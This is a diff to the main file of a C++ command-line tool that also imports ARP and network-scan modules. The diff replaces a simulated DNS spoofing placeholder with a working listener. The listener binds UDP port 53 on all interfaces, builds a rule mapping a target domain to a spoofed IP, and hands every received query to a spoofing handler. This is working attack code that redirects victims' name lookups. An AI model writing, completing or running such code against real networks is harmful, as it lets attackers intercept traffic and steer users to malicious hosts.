@@ -2,8 +2,14 @@
 #include <string>
 #include <vector>
 #include <cstring>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <errno.h>
 #include "network_scan.h"
 #include "arp_operations.h"
+#include "dns_handler.h"
 
 void print_usage(const char* prog) {
     std::cerr << "Usage: " << prog << " <command> [args...]" << std::endl;
@@ -177,16 +183,73 @@ int main(int argc, char* argv[]) {
 
         std::cout << "DEBUG: Starting DNS spoofing for " << domain << " -> " << spoofed_ip << std::endl;
 
-        // In a real implementation, this would set up DNS interception
-        // For now, just acknowledge the command and simulate the process
+        // Create a UDP socket to listen for DNS queries
+        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (sockfd < 0) {
+            std::cerr << "ERROR: Failed to create DNS socket: " << strerror(errno) << std::endl;
+            return 1;
+        }
+
+        // Allow port reuse
+        int opt = 1;
+        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+        // Bind to port 53 (DNS) - this requires root privileges
+        struct sockaddr_in server_addr;
+        memset(&server_addr, 0, sizeof(server_addr));
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(53);
+        server_addr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
+
+        if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            std::cerr << "ERROR: Failed to bind to port 53: " << strerror(errno) <<
+                         " (Try running with root privileges)" << std::endl;
+            close(sockfd);
+            return 1;
+        }
+
         std::cout << "DNS_SPOOF_STARTED: " << domain << " -> " << spoofed_ip << std::endl;
 
-        int counter = 0;
+        // Create DNS spoofing rule
+        DNSSpoofRule rule;
+        rule.domain = std::string(domain);
+        rule.spoofed_ip = std::string(spoofed_ip);
+
+        // Buffer for DNS packets
+        char buffer[512];
+        struct sockaddr_in client_addr;
+        socklen_t client_len = sizeof(client_addr);
+
+        std::cout << "DNS_SPOOF_LISTENING: Waiting for DNS queries..." << std::endl;
+
         while (true) {
-            counter++;
-            std::cout << "DNS_SPOOF_STATUS: Active - Processing requests (iteration " << counter << ")" << std::endl;
-            usleep(5000000); // Sleep for 5 seconds to simulate ongoing process
+            // Receive DNS query
+            ssize_t bytes_received = recvfrom(sockfd, buffer, sizeof(buffer), 0,
+                                            (struct sockaddr*)&client_addr, &client_len);
+
+            if (bytes_received < 0) {
+                std::cerr << "ERROR: Failed to receive DNS query: " << strerror(errno) << std::endl;
+                continue;
+            }
+
+            // Handle the DNS query with spoofing
+            bool response_sent = handle_dns_query_with_spoof(
+                buffer,
+                bytes_received,
+                &client_addr,
+                client_len,
+                sockfd,
+                rule
+            );
+
+            if (!response_sent) {
+                // If we didn't send a spoofed response, just log the query
+                std::string client_ip = inet_ntoa(client_addr.sin_addr);
+                std::cout << "DNS_QUERY_FORWARDED: From " << client_ip << ", Size: " << bytes_received << " bytes" << std::endl;
+            }
         }
+
+        close(sockfd);
     }
     else {
         std::cerr << "Unknown command: " << command << std::endl;
